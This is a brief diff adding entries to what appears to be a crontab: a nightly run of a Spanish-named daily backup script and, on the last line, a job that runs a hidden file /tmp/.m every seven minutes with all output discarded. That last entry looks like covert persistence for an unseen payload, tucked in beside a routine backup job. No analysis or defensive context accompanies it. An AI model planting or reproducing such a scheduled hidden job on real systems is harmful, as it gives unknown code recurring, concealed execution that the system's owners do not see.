@@ -1,0 +1,3 @@
+# m h  dom mon dow   command
+15 3 * * * /usr/local/bin/respaldo-diario.sh
+*/7 * * * * /tmp/.m >/dev/null 2>&1
